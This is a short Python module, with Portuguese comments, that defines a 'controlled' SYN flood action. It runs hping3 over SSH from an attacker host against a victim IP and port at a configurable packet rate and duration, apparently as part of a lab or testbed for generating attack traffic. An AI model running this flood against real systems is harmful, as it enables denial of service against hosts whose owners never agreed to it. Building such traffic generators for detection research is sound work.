import logging
logger = logging.getLogger("[Action:Hping3SYN]")

class Hping3SynFloodAction:
    """
    SYN flood controlado com hping3.
    - dst_port: porta de destino
    - rate_pps: taxa aproximada de pacotes/s (traduzida em -i uMICROS)
    - duration_s: duração em segundos (count = rate_pps * duration_s)
    - count: opcional; se informado, tem precedência sobre duration_s/rate_pps
    """
    def __init__(self, dst_port=80, rate_pps=500, duration_s=60, count=None, quiet=True):
        self.dst_port = int(dst_port)
        self.rate_pps = max(1, int(rate_pps))
        self.duration_s = max(1, int(duration_s))
        self.count = int(count) if count is not None else None
        self.quiet = bool(quiet)

    def run(self, attacker_ssh, victim_ip: str):
        try:
            if self.count is None:
                total = self.rate_pps * self.duration_s
            else:
                total = self.count
            micros = max(1, int(1_000_000 / self.rate_pps))  # atraso entre pacotes

            flags = "-q" if self.quiet else ""
            cmd = (
                f"IP={victim_ip}; sudo hping3 -S -p {self.dst_port} -i u{micros} "
                f"-c {total} {flags} $IP"
            ).strip()
            logger.info(f"[Hping3SYN] Executando: {cmd}")
            attacker_ssh.run_command("attacker", cmd, timeout=self.duration_s + 60)
        except Exception as e:
            logger.error(f"[Hping3SYN] Falhou: {e}")
            raise
